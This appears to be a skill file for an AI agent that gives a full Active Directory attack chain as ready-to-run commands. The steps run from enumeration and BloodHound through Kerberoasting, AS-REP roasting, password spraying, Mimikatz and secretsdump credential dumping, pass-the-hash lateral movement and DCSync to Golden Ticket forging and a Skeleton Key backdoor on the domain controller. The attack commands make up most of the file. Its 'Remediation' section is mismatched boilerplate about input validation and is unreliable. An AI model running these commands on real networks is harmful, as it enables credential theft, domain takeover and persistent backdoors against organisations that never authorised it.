---
name: active-directory-full-attack-chain
description: >
  Execute a complete Active Directory penetration test from initial enumeration to domain dominance.
  Use this skill for AD security assessments including LDAP enumeration, Kerberos attacks (Kerberoasting,
  AS-REP roasting), BloodHound attack path analysis, credential dumping with Mimikatz, lateral movement
  via PsExec/WMI/DCOM, DCSync for NTDS extraction, and Golden/Silver ticket forging. Covers the full
  kill chain from domain user to domain admin.
domain: cybersecurity
subdomain: penetration-testing
category: Network
difficulty: expert
estimated_time: "8-16 hours"
mitre_attack:
  tactics: [TA0006, TA0007, TA0008]
  techniques: [T1558, T1003, T1021, T1087]
platforms: [linux, windows]
tags: [active-directory, kerberos, bloodhound, mimikatz, dcsync, golden-ticket, lateral-movement, domain-admin, pentest]
tools: [bloodhound, mimikatz, impacket, crackmapexec, rubeus, ldapdomaindump, kerbrute]
version: "1.0"
author: CyberSkills-Elite
license: Apache-2.0
---

# Active Directory — Full Attack Chain

## When to Use
- When conducting internal network penetration tests against Windows/AD environments
- When you have domain user credentials and need to escalate to Domain Admin
- During red team engagements targeting corporate Active Directory infrastructure
- When assessing AD security posture and attack paths

## Prerequisites
- Domain user credentials (at minimum)
- Kali Linux or Windows attack machine on the same network
- Impacket toolkit (`pip install impacket`)
- BloodHound + Neo4j for attack path visualization
- CrackMapExec / NetExec for lateral movement
- Mimikatz or Rubeus for credential attacks

## Workflow

### Phase 1: Domain Enumeration

```bash
# Enumerate domain info with domain user creds
# LDAP enumeration
ldapdomaindump -u 'DOMAIN\user' -p 'Password123' dc.domain.local -o ldap_dump/

# Domain info via CrackMapExec
crackmapexec smb dc.domain.local -u user -p 'Password123' --pass-pol
crackmapexec smb 10.10.10.0/24 -u user -p 'Password123' --shares

# Enumerate users
crackmapexec smb dc.domain.local -u user -p 'Password123' --users
# Enumerate groups
crackmapexec smb dc.domain.local -u user -p 'Password123' --groups

# Using Impacket
GetADUsers.py -all domain.local/user:Password123 -dc-ip 10.10.10.1

# PowerView (if on Windows)
Import-Module .\PowerView.ps1
Get-DomainUser -Properties samaccountname,description | fl
Get-DomainGroup -AdminCount | Select-Object name
Get-DomainComputer -Properties name,operatingsystem | fl
Find-LocalAdminAccess
```

### Phase 2: BloodHound — Attack Path Discovery

```bash
# Collect AD data with SharpHound
# From Windows:
.\SharpHound.exe -c All -d domain.local

# From Linux (bloodhound-python):
bloodhound-python -u user -p 'Password123' -d domain.local -dc dc.domain.local -c All

# Start Neo4j and BloodHound
sudo neo4j start
bloodhound --no-sandbox

# Import the .zip data into BloodHound
# Key queries to run:
# - "Find Shortest Paths to Domain Admin"
# - "Find All Kerberoastable Accounts"
# - "Find Principals with DCSync Rights"
# - "Find Computers where Domain Users are Local Admin"
# - "Shortest Paths from Owned Principals"
```

### Phase 3: Kerberos Attacks

```bash
# AS-REP Roasting (no pre-authentication required)
GetNPUsers.py domain.local/ -usersfile users.txt -dc-ip 10.10.10.1 -format hashcat -outputfile asrep.hash

# Crack AS-REP hashes
hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt

# Kerberoasting (request service tickets for SPNs)
GetUserSPNs.py domain.local/user:Password123 -dc-ip 10.10.10.1 -outputfile kerberoast.hash

# Crack Kerberos TGS hashes
hashcat -m 13100 kerberoast.hash /usr/share/wordlists/rockyou.txt

# Using Rubeus (Windows)
.\Rubeus.exe kerberoast /outfile:kerberoast.hash
.\Rubeus.exe asreproast /format:hashcat /outfile:asrep.hash

# Kerbrute — username enumeration + password spraying
kerbrute userenum --dc dc.domain.local -d domain.local users.txt
kerbrute passwordspray --dc dc.domain.local -d domain.local users.txt 'Password123'
```

### Phase 4: Credential Dumping

```bash
# Remote NTDS dump via secretsdump (if you have admin creds)
secretsdump.py domain.local/admin:AdminPass@dc.domain.local

# DCSync attack (requires replication rights)
secretsdump.py -just-dc domain.local/user:Password123@dc.domain.local

# Mimikatz (on compromised Windows machine)
mimikatz.exe
privilege::debug
sekurlsa::logonpasswords     # Dump plaintext passwords from memory
sekurlsa::tickets             # Dump Kerberos tickets
lsadump::dcsync /domain:domain.local /user:Administrator  # DCSync

# LSASS dump (remotely)
crackmapexec smb target -u admin -p 'AdminPass' -M lsassy

# SAM/SYSTEM dump
crackmapexec smb target -u admin -p 'AdminPass' --sam

# DPAPI credential extraction
secretsdump.py -just-dc-user krbtgt domain.local/admin:AdminPass@dc.domain.local
```

### Phase 5: Lateral Movement

```bash
# PsExec (ADMIN$ share)
psexec.py domain.local/admin:AdminPass@target.domain.local

# WMI Exec
wmiexec.py domain.local/admin:AdminPass@target.domain.local

# SMB Exec
smbexec.py domain.local/admin:AdminPass@target.domain.local

# DCOM Exec
dcomexec.py domain.local/admin:AdminPass@target.domain.local

# Evil-WinRM
evil-winrm -i target.domain.local -u admin -p 'AdminPass'

# Pass-the-Hash (use NTLM hash instead of password)
psexec.py domain.local/admin@target -hashes :NTLM_HASH_HERE

# CrackMapExec mass lateral movement
crackmapexec smb 10.10.10.0/24 -u admin -p 'AdminPass' -x 'whoami' --exec-method smbexec

# Over-Pass-the-Hash (convert NTLM to Kerberos TGT)
getTGT.py domain.local/admin -hashes :NTLM_HASH -dc-ip dc.domain.local
export KRB5CCNAME=admin.ccache
psexec.py domain.local/admin@dc.domain.local -k -no-pass
```

### Phase 6: Domain Dominance

```bash
# Golden Ticket (requires krbtgt NTLM hash)
# Get domain SID
lookupsid.py domain.local/admin:AdminPass@dc.domain.local

# Forge Golden Ticket
ticketer.py -nthash KRBTGT_NTLM_HASH -domain-sid S-1-5-21-XXXX -domain domain.local Administrator
export KRB5CCNAME=Administrator.ccache
psexec.py domain.local/Administrator@dc.domain.local -k -no-pass

# Silver Ticket (service-specific)
ticketer.py -nthash SERVICE_NTLM_HASH -domain-sid S-1-5-21-XXXX \
  -domain domain.local -spn cifs/target.domain.local Administrator

# Skeleton Key (backdoor domain controller LSASS)
mimikatz.exe "privilege::debug" "misc::skeleton"
# Now ANY user can authenticate with password "mimikatz"

# AdminSDHolder persistence
# Modify AdminSDHolder ACL to grant yourself persistent admin access

# Domain trust exploitation
Get-DomainTrust
Get-ForestDomain
# Attack across trust boundaries with SID history injection
```

## 🔵 Blue Team Detection
- **SIEM alerting**: Monitor for DCSync (Event ID 4662 with replication GUIDs), Golden Ticket (Event ID 4769 with TGT lifetime anomalies), Kerberoasting (Event ID 4769 with RC4 encryption)
- **Honey accounts**: Create fake service accounts with SPNs and alert on authentication attempts
- **LAPS**: Deploy Local Administrator Password Solution to prevent lateral movement
- **Privileged Access Workstations**: Isolate admin credentials
- **Tiered admin model**: Separate Domain Admin, Server Admin, Workstation Admin

## Key Concepts
| Concept | Description |
|---------|-------------|
| Kerberoasting | Requesting TGS tickets for service accounts and cracking offline |
| AS-REP Roasting | Attacking accounts without Kerberos pre-authentication |
| DCSync | Mimicking domain controller replication to extract NTDS credentials |
| Golden Ticket | Forged TGT using krbtgt hash — unlimited domain access |
| Silver Ticket | Forged TGS for specific service — targeted access |
| Pass-the-Hash | Using NTLM hash directly for authentication without password |
| BloodHound | Graph-based AD attack path visualization tool |

## Output Format
```
Active Directory Pentest Report
================================
Domain: CORP.DOMAIN.LOCAL
Domain Controllers: DC01, DC02
Forest Functional Level: Windows Server 2016

Attack Path Summary:
  Initial Access: Domain User (jsmith) via password spray
  → Kerberoasted svc_sql (cracked in 2 minutes)
  → svc_sql is local admin on SQL01
  → Credential dump on SQL01 → Domain Admin hash
  → DCSync → Full NTDS.dit extraction
  → 4,532 user accounts compromised

Critical Findings:
1. Kerberoastable service account with weak password (svc_sql: Summer2024!)
2. 47 users with "Do not require Kerberos pre-authentication" (AS-REP roastable)
3. Domain Users group has local admin on 12 servers
4. No LAPS deployed — same local admin password on all workstations
5. krbtgt password last changed: 2019 (Golden Ticket risk)
```

## 🛡️ Remediation & Mitigation Strategy
- **Input Validation:** Sanitize and strictly type-check all inputs.
- **Least Privilege:** Constrain component execution bounds.


## 📚 Shared Resources
> For cross-cutting methodology applicable to all vulnerability classes, see:
> - [`_shared/references/elite-chaining-strategy.md`](../_shared/references/elite-chaining-strategy.md) — Exploit chaining methodology and high-payout chain patterns
> - [`_shared/references/elite-report-writing.md`](../_shared/references/elite-report-writing.md) — HackerOne-optimized report writing, CWE quick reference
> - [`_shared/references/real-world-bounties.md`](../_shared/references/real-world-bounties.md) — Verified disclosed bounties by vulnerability class

## References
- MITRE ATT&CK: [Kerberos Attacks](https://attack.mitre.org/techniques/T1558/)
- HackTricks: [Active Directory Methodology](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology)
- Impacket: [Tool Documentation](https://github.com/fortra/impacket)
- BloodHound: [Official Wiki](https://bloodhound.readthedocs.io/)
